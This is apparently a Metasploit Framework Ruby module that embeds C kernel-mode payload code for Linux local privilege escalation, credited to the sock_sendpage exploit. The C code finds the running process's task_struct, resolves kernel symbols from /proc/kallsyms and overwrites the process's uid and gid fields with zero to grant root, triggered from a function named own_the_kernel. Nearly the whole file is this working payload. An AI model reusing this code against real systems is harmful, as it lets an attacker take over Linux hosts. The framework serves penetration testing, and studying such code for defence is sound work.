require 'msf/core/exploit/local/compile_c'

module Msf
module Exploit::Local::LinuxKernel
	include Msf::Exploit::Local::CompileC

	#
	# Provides functions for looking up kernel symbols
	#
	# Because all of this runs in kernel mode, we don't have the ability to call
	# syscalls, nor can we print anything. If this fails, it's pretty much
	# silent.
	#
	def kernel_code_h(metasm_exe)

		# Taken from sock_sendpage.c
		cparser.parse(%q^
#ifndef _KERNEL_CODE_H
#define _KERNEL_CODE_H

#ifndef NULL
#define NULL ((void*)0)
#endif

#define PAGE_SIZE   0x1000
#define PAGE_MASK4K (~(PAGE_SIZE -1))
#define PAGE_MASK8K (~(PAGE_SIZE*2 -1))

#define TASK_RUNNING 0

int _page_size;

/*
 * Returns 0 if the stack is invalid, 1 otherwise.
 */
static int is_valid_stack(unsigned long stack)
{
	if (stack > 0xc0000000 && stack < 0xff000000) {
		long state = *((unsigned long *)stack);
		if (state == 0)
			return 1;
		else
			return 0;
	}
	return 0;
}


/*
 * Computes the address of the task_struct from the
 * address of the kernel stack. Returns NULL on failure.
 */
static void *current_task_struct()
{
	unsigned long stack,task_struct,stack4k,stack8k;
	int dummy;
	stack = (unsigned long)&dummy;
	stack4k = stack & PAGE_MASK4K;
	stack8k = stack & PAGE_MASK8K;

#ifdef __x86_64__

	task_struct  = *((unsigned long *)stack8k);

#else // x86_32

	task_struct = *((unsigned long*)stack4k);
	if(!is_valid_stack(task_struct)) {
		task_struct = *((unsigned long*)stack8k);
		if (!is_valid_stack(task_struct))
			return NULL;
	}
#endif

	/*
	 * The TASK_RUNNING is the only possible state for a process executing in
	 * user-space. Verify that's what we've got just to make sure this is the
	 * right memory location.
	 */
	if (*(unsigned long *)task_struct == TASK_RUNNING)
		return (void*)task_struct;

	return NULL;
}

int got_ring0 = 0;

unsigned long uid, gid;

static unsigned long get_kernel_sym(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[256];
	int ret;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		f = fopen("/proc/ksyms", "r");
		if (f == NULL) {
			printf("Unable to obtain symbol listing!\n");
			return 0;
		}
	}

	ret = 0;
	while(ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			printf(" [+] Resolved %s to %p\n", name, (void *)addr);
			fclose(f);
			return addr;
		}
	}

	fclose(f);
	return 0;
}

#define THRESHOLD 1000

static void
change_cred_in_task_struct(void)
{
	unsigned int *task_struct;
	int i;

	task_struct = (unsigned int *)current_task_struct();

	/*
	 * Make sure this is the right place by checking for our uid/gid in the expected place
	 */
	for (i =0; task_struct && i < THRESHOLD; i++) {
		if (task_struct[0] == uid && task_struct[1] == uid &&
				task_struct[2] == uid && task_struct[3] == uid &&
				task_struct[4] == gid && task_struct[5] == gid &&
				task_struct[6] == gid && task_struct[7] == gid) {
			task_struct[0] = task_struct[1] =
			task_struct[2] = task_struct[3] =
			task_struct[4] = task_struct[5] =
			task_struct[6] = task_struct[7] = 0;
			break;
		}

		task_struct++;
	}

	return;
}

int __attribute__((regparm(3)))
own_the_kernel(unsigned long a, unsigned long b, unsigned long c, unsigned long d, unsigned long e)
{

	got_ring0 = 1;
	change_cred_in_task_struct();
	return -1;
}

#endif /* _KERNEL_CODE_H */
^, "kernel_code.c")

		nil
	end

end
end
